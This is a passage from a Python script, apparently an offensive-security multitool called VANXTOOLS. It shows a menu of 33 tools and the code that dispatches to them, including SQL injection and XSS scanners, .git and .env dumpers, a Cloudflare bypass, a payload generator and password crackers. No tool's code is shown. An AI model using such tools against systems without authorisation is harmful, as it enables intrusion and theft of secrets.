        print(f"{C_YEL}[{C_RESET} 8 {C_YEL}]{C_RESET} Admin Login Finder")
        print(f"{C_YEL}[{C_RESET} 9 {C_YEL}]{C_RESET} Cloudflare Real IP Finder")
        print(f"{C_YEL}[{C_RESET}10 {C_YEL}]{C_RESET} Google Dork Generator")
        print(f"{C_YEL}[{C_RESET}11 {C_YEL}]{C_RESET} Whois Domain Lookup")
        print(f"{C_YEL}[{C_RESET}12 {C_YEL}]{C_RESET} SSL Certificate Info")
        print(f"{C_YEL}[{C_RESET}13 {C_YEL}]{C_RESET} robots.txt & sitemap.xml Parser")
        print(f"{C_YEL}[{C_RESET}14 {C_YEL}]{C_RESET} XSS Reflection Scanner")
        print(f"{C_YEL}[{C_RESET}15 {C_YEL}]{C_RESET} SQL Injection Error Scanner")
        print(f"{C_YEL}[{C_RESET}16 {C_YEL}]{C_RESET} Subdomain Takeover Checker")
        print(f"{C_YEL}[{C_RESET}17 {C_YEL}]{C_RESET} .git Dumper Check")
        print(f"{C_YEL}[{C_RESET}18 {C_YEL}]{C_RESET} .env & Config Dumper")
        print(f"{C_YEL}[{C_RESET}19 {C_YEL}]{C_RESET} File Upload Vulnerability Test")
        print(f"{C_YEL}[{C_RESET}20 {C_YEL}]{C_RESET} CORS Misconfig Check")
        print(f"{C_YEL}[{C_RESET}21 {C_YEL}]{C_RESET} WordPress Basic Scanner")
        print(f"{C_YEL}[{C_RESET}22 {C_YEL}]{C_RESET} CMS Detector")
        print(f"{C_YEL}[{C_RESET}23 {C_YEL}]{C_RESET} Ping Sweep (Subnet)")
        print(f"{C_YEL}[{C_RESET}24 {C_YEL}]{C_RESET} Traceroute")
        print(f"{C_YEL}[{C_RESET}25 {C_YEL}]{C_RESET} GeoIP & ASN Lookup")
        print(f"{C_YEL}[{C_RESET}26 {C_YEL}]{C_RESET} URL Expander")
        print(f"{C_YEL}[{C_RESET}27 {C_YEL}]{C_RESET} HTML Link & Form Extractor")
        print(f"{C_YEL}[{C_RESET}28 {C_YEL}]{C_RESET} Cookie & Security Header Analyzer")
        print(f"{C_YEL}[{C_RESET}29 {C_YEL}]{C_RESET} Git Repo Cloner")
        print(f"{C_YEL}[{C_RESET}30 {C_YEL}]{C_RESET} Image Metadata Extractor (EXIF)")
        print(f"{C_YEL}[{C_RESET}31 {C_YEL}]{C_RESET} Phone Number Info")
        print(f"{C_YEL}[{C_RESET}32 {C_YEL}]{C_RESET} IP Whois Lookup")
        print(f"{C_YEL}[{C_RESET}33 {C_YEL}]{C_RESET} ZIP Password Cracker")
        print(f"{C_YEL}[{C_RESET} 0 {C_YEL}]{C_RESET} Exit")
        
        try:
            choice = input(f"\n{C_CYN}VANXTOOLS > {C_RESET}").strip()
            if choice == "1": tool_01_clone()
            elif choice == "2": tool_02_headers()
            elif choice == "3": tool_03_dirbuster()
            elif choice == "4": tool_04_dns_enum()
            elif choice == "5": tool_05_port_scan()
            elif choice == "6": tool_06_hash_crack()
            elif choice == "7": tool_07_payload_gen()
            elif choice == "8": tool_08_admin_finder()
            elif choice == "9": tool_09_cf_bypass()
            elif choice == "10": tool_10_dorks()
            elif choice == "11": tool_11_whois()
            elif choice == "12": tool_12_ssl_check()
            elif choice == "13": tool_13_robots()
            elif choice == "14": tool_14_xss_scanner()
            elif choice == "15": tool_15_sqli_scanner()
            elif choice == "16": tool_16_subdomain_takeover()
            elif choice == "17": tool_17_git_dumper()
            elif choice == "18": tool_18_env_dumper()
            elif choice == "19": tool_19_file_upload_check()
            elif choice == "20": tool_20_cors_check()
            elif choice == "21": tool_21_wp_scanner()
            elif choice == "22": tool_22_cms_detect()
            elif choice == "23": tool_23_ping_sweep()
            elif choice == "24": tool_24_traceroute()
            elif choice == "25": tool_25_geo_ip()
            elif choice == "26": tool_26_url_expander()
            elif choice == "27": tool_27_html_parser()
            elif choice == "28": tool_28_cookie_analyzer()
            elif choice == "29": tool_29_git_cloner()
            elif choice == "30": tool_30_metadata_extractor()
            elif choice == "31": tool_31_phone_lookup()
            elif choice == "32": tool_32_whois_ip()
            elif choice == "33": tool_33_zip_cracker()
            elif choice == "0": sys.exit(0)
            else: log("Invalid choice.", "err")
        except KeyboardInterrupt:
            print("\n")
            sys.exit(0)
        except Exception as e:
            log(f"Runtime Error: {e}", "err")
        
        input(f"\n{C_YEL}Press Enter to continue...{C_RESET}")

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print("Installing dependencies...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    
    main()